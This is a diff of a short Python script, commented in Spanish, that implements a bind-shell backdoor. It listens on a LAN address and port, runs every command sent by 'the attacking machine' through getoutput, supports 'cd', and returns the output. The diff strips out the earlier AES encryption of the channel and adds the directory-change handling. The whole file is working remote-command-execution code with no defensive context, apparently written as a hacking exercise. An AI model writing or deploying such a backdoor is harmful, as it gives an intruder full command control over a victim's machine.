@@ -1,35 +1,47 @@
 from socket import socket
 from subprocess import getoutput
-from Crypto.Cipher import AES
+from os import chdir, getcwd
+from time import sleep
 
+# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
 server_address = ('192.168.6.38', 5000)
-key = b'Sixteen byte key'
 
-def encrypt(data, key, iv):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return cipher.encrypt(data.ljust(16))
-
-def decrypt(data, key, iv):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    return cipher.decrypt(data).strip()
-
+# Creamos el socket (la conexión)
 server_socket = socket()
+
+# Le pasamos la tupla donde especificamos donde escuchar
 server_socket.bind(server_address)
+
+# Cantidad de clientes maximos que se pueden conectar:
 server_socket.listen(1)
 
+# Esperamos a recibir una conexión y acceptarla:
 client_socket, client_address = server_socket.accept()
+
 estado = True
 
 while estado:
-    data = client_socket.recv(4096)
-    iv, encrypted_msg = data[:16], data[16:]
-    comando = decrypt(encrypted_msg, key, iv).decode()
+    # Recibimos el comando de la máquina atacante
+    comando = client_socket.recv(4096).decode()
 
+    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
     if comando == 'exit':
+        # Cerramos la conexión con el cliente
         client_socket.close()
+        # Cerramos el socket servidor
         server_socket.close()
         estado = False
-    else:
-        resultado = getoutput(comando)
-        iv = os.urandom(16)
-        client_socket.send(iv + encrypt(resultado.encode(), key, iv))
+    
+    elif comando.split(" ")[0] == 'cd':
+        # Cambiamos de directorio de trabajo
+        chdir(" ".join(comando.split(" ")[1:]))
+        client_socket.send("ruta actual: {}".format(getcwd()).encode())
+    
+    else :
+        # Ejecutamos el comando y obtenemos su salida:
+        salida = getoutput(comando)
+
+        # Enviamos la salida a la máquina atacante
+        client_socket.send(salida.encode())
+    
+    sleep(0.1)
